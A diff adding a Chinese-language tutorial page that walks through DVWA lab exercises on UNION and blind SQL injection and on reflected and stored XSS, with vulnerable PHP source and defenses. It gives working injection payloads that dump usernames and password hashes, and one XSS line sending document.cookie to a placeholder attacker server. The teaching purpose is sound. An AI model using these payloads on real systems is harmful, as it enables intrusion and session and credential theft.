+<td><code>SELECT * FROM users</code></td>
+</tr>
+<tr>
+<td><code>WHERE</code></td>
+<td>条件过滤</td>
+<td><code>SELECT * FROM users WHERE id = 1</code></td>
+</tr>
+<tr>
+<td><code>UNION</code></td>
+<td>合并两个查询的结果</td>
+<td><code>SELECT name FROM users UNION SELECT password FROM users</code></td>
+</tr>
+<tr>
+<td><code>ORDER BY</code></td>
+<td>排序</td>
+<td><code>SELECT * FROM users ORDER BY 1</code></td>
+</tr>
+<tr>
+<td><code>--</code></td>
+<td>SQL 注释符</td>
+<td>后面的内容被当作注释忽略</td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td>MySQL 注释符</td>
+<td>同上</td>
+</tr>
+</tbody></table>
+<p><strong>UNION 注释</strong>是 SQL 注入中最常用的技术：</p>
+<ul>
+<li><code>UNION</code> 可以将两个 SELECT 语句的结果<strong>合并</strong>在一起显示</li>
+<li>前提是两个 SELECT 的<strong>列数必须相同</strong></li>
+<li>我们可以通过 <code>ORDER BY N</code> 来猜测列数</li>
+</ul>
+<h3 id="7-3-动手实践"><a href="#7-3-动手实践" class="headerlink" title="7.3 动手实践"></a>7.3 动手实践</h3><h4 id="第一步：正常使用-1"><a href="#第一步：正常使用-1" class="headerlink" title="第一步：正常使用"></a>第一步：正常使用</h4><ol>
+<li>点击左侧的 <strong>SQL Injection</strong></li>
+<li>输入一个数字（比如 <code>1</code>），点击 Submit</li>
+<li>你会看到 ID 为 1 的用户信息</li>
+</ol>
+<h4 id="第二步：测试注入点"><a href="#第二步：测试注入点" class="headerlink" title="第二步：测试注入点"></a>第二步：测试注入点</h4><p>输入 <code>1&#39;</code>（在数字 1 后面加一个单引号），点击 Submit。</p>
+<p>如果页面报错了（类似 <code>You have an error in your SQL syntax</code>），说明<strong>单引号没有被过滤</strong>，并且成功干扰了 SQL 语句——这就是一个<strong>注入点</strong>。</p>
+<blockquote>
+<p>为什么加单引号会报错？因为后端 SQL 可能是 <code>WHERE user_id = &#39;1&#39;&#39;</code>，多了一个单引号导致 SQL 语法错误。</p>
+</blockquote>
+<h4 id="第三步：使用-UNION-注入获取数据"><a href="#第三步：使用-UNION-注入获取数据" class="headerlink" title="第三步：使用 UNION 注入获取数据"></a>第三步：使用 UNION 注入获取数据</h4><p><strong>Step 1：判断列数</strong></p>
+<p>输入：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>ORDER BY <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>正常显示，说明至少有 1 列。</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>ORDER BY <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p>正常显示，说明至少有 2 列。</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>ORDER BY <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p>报错了！说明只有 <strong>2 列</strong>。</p>
+<p><strong>Step 2：确定哪些列会显示在页面上</strong></p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p>页面上会显示 <code>1</code> 和 <code>2</code>，说明<strong>两列都会显示</strong>。</p>
+<p><strong>Step 3：获取数据库信息</strong></p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>UNION SELECT user(), database()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>user()</code> — 当前数据库用户</li>
+<li><code>database()</code> — 当前数据库名</li>
+</ul>
+<p>你会看到类似 <code>root@localhost</code> 和 <code>dvwa</code> 的结果。</p>
+<p><strong>Step 4：获取所有表名</strong></p>
+<p>在 MySQL 中，所有数据库的表信息存储在 <code>information_schema.tables</code> 中：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = <span class="hljs-comment">&#x27;dvwa&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>你会看到 dvwa 数据库中所有的表名，其中 <code>users</code> 表通常是我们最感兴趣的。</p>
+<p><strong>Step 5：获取 users 表的列名</strong></p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = <span class="hljs-comment">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>你会看到 <code>users</code> 表有 <code>user_id</code>、<code>first_name</code>、<code>last_name</code>、<code>user</code>、<code>password</code>、<code>avatar</code> 等列。</p>
+<p><strong>Step 6：获取用户名和密码</strong></p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>UNION SELECT user, password FROM users<br></code></pre></td></tr></table></figure>
+
+<p>现在你获得了所有用户的用户名和密码！</p>
+<blockquote>
+<p>注意：密码通常是经过 MD5 哈希处理的，你可以使用在线 MD5 解密网站来尝试还原原文。</p>
+</blockquote>
+<h3 id="7-4-漏洞原理（源码分析）"><a href="#7-4-漏洞原理（源码分析）" class="headerlink" title="7.4 漏洞原理（源码分析）"></a>7.4 漏洞原理（源码分析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> );<br>    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID: <span class="hljs-subst">&#123;$row[&#x27;first_name&#x27;]&#125;</span>&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;First name: <span class="hljs-subst">&#123;$row[&#x27;first_name&#x27;]&#125;</span>&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Last name: <span class="hljs-subst">&#123;$row[&#x27;last_name&#x27;]&#125;</span>&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>问题分析</strong>：</p>
+<ol>
+<li><code>$id = $_GET[ &#39;id&#39; ];</code> — 直接获取用户输入</li>
+<li><code>&quot;SELECT ... WHERE user_id = &#39;$id&#39;;&quot;</code> — <strong>直接拼接</strong>到 SQL 语句中</li>
+<li>没有任何过滤或参数化处理</li>
+</ol>
+<h3 id="7-5-知识点总结"><a href="#7-5-知识点总结" class="headerlink" title="7.5 知识点总结"></a>7.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SQL 注入</td>
+<td>通过构造恶意输入改变 SQL 语句含义</td>
+</tr>
+<tr>
+<td>UNION 注入</td>
+<td>使用 UNION 合并恶意查询结果到正常结果中</td>
+</tr>
+<tr>
+<td>information_schema</td>
+<td>MySQL 的系统数据库，存储所有数据库的元信息</td>
+</tr>
+<tr>
+<td>ORDER BY</td>
+<td>用于判断查询结果的列数</td>
+</tr>
+<tr>
+<td>注释符 <code>--</code></td>
+<td>用于忽略原 SQL 语句中多余的部分</td>
+</tr>
+</tbody></table>
+<h3 id="7-6-防御方法"><a href="#7-6-防御方法" class="headerlink" title="7.6 防御方法"></a>7.6 防御方法</h3><ul>
+<li><strong>参数化查询（Prepared Statements）</strong>：最有效的防御方式，将 SQL 语句和数据分开处理</li>
+<li><strong>输入验证</strong>：检查输入是否为数字（如果是数字型 ID）</li>
+<li><strong>最小权限原则</strong>：数据库用户只授予必要的最小权限</li>
+<li><strong>使用 ORM 框架</strong>：现代框架（如 Laravel Eloquent）自带参数化查询</li>
+</ul>
+<p>参数化查询示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-variable">$id</span>);  <span class="hljs-comment">// &quot;i&quot; 表示参数类型为整数</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、SQL-Injection（Blind）（盲注）"><a href="#八、SQL-Injection（Blind）（盲注）" class="headerlink" title="八、SQL Injection（Blind）（盲注）"></a>八、SQL Injection（Blind）（盲注）</h2><h3 id="8-1-这个漏洞是什么？"><a href="#8-1-这个漏洞是什么？" class="headerlink" title="8.1 这个漏洞是什么？"></a>8.1 这个漏洞是什么？</h3><p><strong>盲注</strong>是 SQL 注入的一种特殊形式。区别在于：</p>
+<ul>
+<li><strong>普通 SQL 注入</strong>：查询结果会<strong>直接显示</strong>在页面上</li>
+<li><strong>盲注</strong>：查询结果<strong>不会显示</strong>在页面上，但攻击者可以通过<strong>页面的其他反应</strong>（比如”有结果”vs”无结果”，或”响应快”vs”响应慢”）来<strong>逐个字符地猜出数据</strong></li>
+</ul>
+<p>就像你问一个人”密码第一位是不是 a？”，他只会回答”是”或”不是”，你通过不断提问最终猜出完整密码。</p>
+<h3 id="8-2-盲注的两种类型"><a href="#8-2-盲注的两种类型" class="headerlink" title="8.2 盲注的两种类型"></a>8.2 盲注的两种类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>原理</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>布尔盲注</strong></td>
+<td>根据页面返回 True&#x2F;False 两种不同状态来判断</td>
+<td>页面有明确的两种不同反应</td>
+</tr>
+<tr>
+<td><strong>时间盲注</strong></td>
+<td>通过 <code>SLEEP()</code> 函数让数据库延迟响应，根据响应时间判断</td>
+<td>页面没有明显不同反应</td>
+</tr>
+</tbody></table>
+<h3 id="8-3-动手实践"><a href="#8-3-动手实践" class="headerlink" title="8.3 动手实践"></a>8.3 动手实践</h3><h4 id="第一步：观察页面行为"><a href="#第一步：观察页面行为" class="headerlink" title="第一步：观察页面行为"></a>第一步：观察页面行为</h4><ol>
+<li>点击左侧的 <strong>SQL Injection (Blind)</strong></li>
+<li>输入 <code>1</code>，点击 Submit — 页面显示 “User ID exists in the database”</li>
+<li>输入 <code>999</code>，点击 Submit — 页面显示 “User ID is MISSING from the database”</li>
+</ol>
+<p>可以看到，页面只有<strong>两种状态</strong>：存在 &#x2F; 不存在。这就是布尔盲注。</p>
+<h4 id="第二步：测试注入点-1"><a href="#第二步：测试注入点-1" class="headerlink" title="第二步：测试注入点"></a>第二步：测试注入点</h4><p>输入 <code>1&#39; AND 1=1</code>，页面显示 “User ID exists”（因为 1&#x3D;1 为真，条件成立）。</p>
+<p>输入 <code>1&#39; AND 1=2</code>，页面显示 “User ID is MISSING”（因为 1&#x3D;2 为假，条件不成立）。</p>
+<p>这说明注入成功了！我们可以通过构造<strong>真假条件</strong>来逐个字符猜数据。</p>
+<h4 id="第三步：猜数据库名的第一个字符"><a href="#第三步：猜数据库名的第一个字符" class="headerlink" title="第三步：猜数据库名的第一个字符"></a>第三步：猜数据库名的第一个字符</h4><p>MySQL 的 <code>SUBSTRING()</code> 函数可以从字符串中截取指定位置的字符：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; AND SUBSTRING<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span><span class="hljs-punctuation">)</span> = &#x27;d&#x27; #<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>database()</code> 返回当前数据库名</li>
+<li><code>SUBSTRING(database(), 1, 1)</code> 取数据库名的<strong>第 1 个字符</strong></li>
+<li><code>= &#39;d&#39;</code> 判断这个字符是否是 <code>d</code></li>
+<li><code>#</code> 是 MySQL 的注释符，用于注释掉后面的 SQL 语句</li>
+</ul>
+<p>如果页面显示 “exists”，说明第一个字符是 <code>d</code>。如果不是，就尝试其他字符。</p>
+<h4 id="第四步：逐个猜出完整数据库名"><a href="#第四步：逐个猜出完整数据库名" class="headerlink" title="第四步：逐个猜出完整数据库名"></a>第四步：逐个猜出完整数据库名</h4><p>继续猜第 2 个字符、第 3 个字符……直到猜出完整的 <code>dvwa</code>：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; AND SUBSTRING<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span><span class="hljs-punctuation">)</span> = &#x27;v&#x27; #<br><span class="hljs-number">1</span>&#x27; AND SUBSTRING<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span><span class="hljs-punctuation">)</span> = &#x27;w&#x27; #<br><span class="hljs-number">1</span>&#x27; AND SUBSTRING<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span><span class="hljs-punctuation">)</span> = &#x27;<span class="hljs-keyword">a</span>&#x27; #<br></code></pre></td></tr></table></figure>
+
+<h4 id="第五步：猜表名"><a href="#第五步：猜表名" class="headerlink" title="第五步：猜表名"></a>第五步：猜表名</h4><p>确认数据库名是 <code>dvwa</code> 后，猜表名：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; AND SUBSTRING((<span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;g&#x27;</span> #<br></code></pre></td></tr></table></figure>
+
+<p>这里我们在子查询中获取第一个表名，然后逐个字符猜。</p>
+<h4 id="第六步：使用时间盲注（可选）"><a href="#第六步：使用时间盲注（可选）" class="headerlink" title="第六步：使用时间盲注（可选）"></a>第六步：使用时间盲注（可选）</h4><p>如果连”存在&#x2F;不存在”的区别都没有（页面始终一样），可以用时间盲注：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>&#x27; AND IF<span class="hljs-punctuation">(</span>SUBSTRING<span class="hljs-punctuation">(</span>database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-punctuation">)</span>=&#x27;d&#x27;, SLEEP<span class="hljs-punctuation">(</span><span class="hljs-number">5</span><span class="hljs-punctuation">)</span>, <span class="hljs-number">0</span><span class="hljs-punctuation">)</span> #<br></code></pre></td></tr></table></figure>
+
+<p>如果第一个字符是 <code>d</code>，数据库会”睡” 5 秒再返回结果。通过测量响应时间就能判断对错。</p>
+<h3 id="8-4-漏洞原理"><a href="#8-4-漏洞原理" class="headerlink" title="8.4 漏洞原理"></a>8.4 漏洞原理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> ) &#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) &gt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;User ID exists in the database.&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;User ID is MISSING from the database.&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意这里和普通注入的区别：<strong>不显示查询结果的具体内容</strong>，只告诉你有没有数据。这就是为什么需要”盲注”。</p>
+<h3 id="8-5-知识点总结"><a href="#8-5-知识点总结" class="headerlink" title="8.5 知识点总结"></a>8.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>布尔盲注</td>
+<td>通过页面 True&#x2F;False 两种状态逐字符猜数据</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td>通过响应时间差异逐字符猜数据</td>
+</tr>
+<tr>
+<td>SUBSTRING()</td>
+<td>截取字符串的子串</td>
+</tr>
+<tr>
+<td>SLEEP()</td>
+<td>让数据库暂停执行指定秒数</td>
+</tr>
+<tr>
+<td>LIMIT</td>
+<td>限制查询结果的数量和偏移</td>
+</tr>
+</tbody></table>
+<h3 id="8-6-防御方法"><a href="#8-6-防御方法" class="headerlink" title="8.6 防御方法"></a>8.6 防御方法</h3><p>与普通 SQL 注入相同：<strong>参数化查询</strong>是最佳防御手段。同时也可以限制数据库的响应时间、使用 WAF（Web 应用防火墙）等。</p>
+<hr>
+<h2 id="九、XSS（Reflected）（反射型跨站脚本）"><a href="#九、XSS（Reflected）（反射型跨站脚本）" class="headerlink" title="九、XSS（Reflected）（反射型跨站脚本）"></a>九、XSS（Reflected）（反射型跨站脚本）</h2><h3 id="9-1-这个漏洞是什么？"><a href="#9-1-这个漏洞是什么？" class="headerlink" title="9.1 这个漏洞是什么？"></a>9.1 这个漏洞是什么？</h3><p><strong>XSS（Cross-Site Scripting）</strong>，跨站脚本攻击。攻击者向网页中注入<strong>恶意 JavaScript 代码</strong>，当其他用户浏览该网页时，注入的代码会在用户的浏览器中执行。</p>
+<p><strong>反射型 XSS</strong> 的特点：</p>
+<ul>
+<li>恶意代码<strong>不会保存</strong>到服务器上</li>
+<li>攻击者需要<strong>构造一个包含恶意代码的链接</strong>，诱导受害者点击</li>
+<li>代码通过 URL 参数<strong>反射</strong>回页面并执行</li>
+</ul>
+<p>打个比方：攻击者在一张名片（URL）上写了恶意内容，你打开这个名片时，内容就在你的浏览器里执行了。</p>
+<h3 id="9-2-前置知识：JavaScript-基础"><a href="#9-2-前置知识：JavaScript-基础" class="headerlink" title="9.2 前置知识：JavaScript 基础"></a>9.2 前置知识：JavaScript 基础</h3><table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>alert(&#39;XSS&#39;)</code></td>
+<td>弹出一个对话框显示 “XSS”</td>
+</tr>
+<tr>
+<td><code>document.cookie</code></td>
+<td>获取当前页面的 Cookie</td>
+</tr>
+<tr>
+<td><code>window.location</code></td>
+<td>获取或修改当前页面的 URL</td>
+</tr>
+<tr>
+<td><code>document.getElementById()</code></td>
+<td>获取页面上的元素</td>
+</tr>
+</tbody></table>
+<p>在 XSS 漏洞验证中，最经典的测试 payload 就是 <code>alert(&#39;XSS&#39;)</code>——如果弹出了对话框，说明存在 XSS 漏洞。</p>
+<h3 id="9-3-动手实践"><a href="#9-3-动手实践" class="headerlink" title="9.3 动手实践"></a>9.3 动手实践</h3><h4 id="第一步：正常使用-2"><a href="#第一步：正常使用-2" class="headerlink" title="第一步：正常使用"></a>第一步：正常使用</h4><ol>
+<li>点击左侧的 <strong>XSS (Reflected)</strong></li>
+<li>输入一个名字（比如 <code>hello</code>），点击 Submit</li>
+<li>页面会显示 “hello”</li>
+</ol>
+<h4 id="第二步：测试-XSS"><a href="#第二步：测试-XSS" class="headerlink" title="第二步：测试 XSS"></a>第二步：测试 XSS</h4><p>在输入框中输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>点击 Submit，如果页面弹出了一个显示 “XSS” 的对话框，<strong>恭喜，XSS 漏洞验证成功！</strong></p>
+<h4 id="第三步：窃取-Cookie"><a href="#第三步：窃取-Cookie" class="headerlink" title="第三步：窃取 Cookie"></a>第三步：窃取 Cookie</h4><p>在实际攻击中，攻击者通常会尝试窃取用户的 Cookie：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://攻击者服务器/steal.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这段代码会把当前用户的 Cookie 发送到攻击者的服务器上。</p>
+<blockquote>
+<p><strong>注意</strong>：我们只是学习原理，不要真的去窃取别人的 Cookie。</p>
+</blockquote>
+<h4 id="第四步：通过-URL-注入"><a href="#第四步：通过-URL-注入" class="headerlink" title="第四步：通过 URL 注入"></a>第四步：通过 URL 注入</h4><p>反射型 XSS 更常见的利用方式是通过 URL 参数。观察提交后的 URL：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">.../xss_r/<span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>攻击者可以把这个 URL 发给受害者，受害者点击后就会触发 XSS。</p>
+<h3 id="9-4-漏洞原理（源码分析）"><a href="#9-4-漏洞原理（源码分析）" class="headerlink" title="9.4 漏洞原理（源码分析）"></a>9.4 漏洞原理（源码分析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>问题分析</strong>：</p>
+<ul>
+<li><code>$_GET[ &#39;name&#39; ]</code> — 直接获取用户输入</li>
+<li><code>&#39;Hello &#39; . $_GET[ &#39;name&#39; ]</code> — <strong>直接拼接</strong>到 HTML 中输出</li>
+<li>没有对 <code>&lt;script&gt;</code> 等标签进行任何过滤或转义</li>
+</ul>
+<h3 id="9-5-知识点总结"><a href="#9-5-知识点总结" class="headerlink" title="9.5 知识点总结"></a>9.5 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>XSS</td>
+<td>向网页注入恶意 JavaScript 代码</td>
+</tr>
+<tr>
+<td>反射型 XSS</td>
+<td>恶意代码通过 URL 参数反射回页面，不会保存到服务器</td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;</code> 标签</td>
+<td>HTML 中嵌入 JavaScript 的标签</td>
+</tr>
+<tr>
+<td>alert()</td>
+<td>JavaScript 弹出对话框的函数</td>
+</tr>
+</tbody></table>
+<h3 id="9-6-防御方法"><a href="#9-6-防御方法" class="headerlink" title="9.6 防御方法"></a>9.6 防御方法</h3><ul>
+<li><strong>输出转义（HTML Entity Encoding）</strong>：将 <code>&lt;</code> 转为 <code>&amp;lt;</code>，<code>&gt;</code> 转为 <code>&amp;gt;</code>，这样浏览器不会将它们解析为 HTML 标签</li>
+<li><strong>Content Security Policy (CSP)</strong>：设置 HTTP 头，限制页面可以加载哪些脚本</li>
+<li><strong>输入验证</strong>：白名单允许的字符</li>
+</ul>
+<hr>
+<h2 id="十、XSS（Stored）（存储型跨站脚本）"><a href="#十、XSS（Stored）（存储型跨站脚本）" class="headerlink" title="十、XSS（Stored）（存储型跨站脚本）"></a>十、XSS（Stored）（存储型跨站脚本）</h2><h3 id="10-1-这个漏洞是什么？"><a href="#10-1-这个漏洞是什么？" class="headerlink" title="10.1 这个漏洞是什么？"></a>10.1 这个漏洞是什么？</h3><p><strong>存储型 XSS</strong> 是 XSS 中<strong>危害最大</strong>的类型。</p>
+<p>与反射型不同，存储型 XSS 的恶意代码会被<strong>永久保存</strong>到服务器上（通常是数据库中）。每当其他用户访问包含恶意代码的页面时，代码就会自动执行。</p>
+<p>打个比方：反射型 XSS 像是在传纸条——纸条上写了恶意内容，你看完就没了。存储型 XSS 像是在黑板上写字——所有走进教室的人都能看到。</p>
+<h3 id="10-2-动手实践"><a href="#10-2-动手实践" class="headerlink" title="10.2 动手实践"></a>10.2 动手实践</h3><h4 id="第一步：正常使用-3"><a href="#第一步：正常使用-3" class="headerlink" title="第一步：正常使用"></a>第一步：正常使用</h4><ol>
+<li>点击左侧的 <strong>XSS (Stored)</strong></li>
+<li>你会看到一个留言板（Guestbook），可以输入 Name 和 Message</li>
+<li>正常输入一条留言，比如 Name: <code>张三</code>，Message: <code>你好世界</code></li>
+<li>提交后，留言会显示在下方</li>
+</ol>
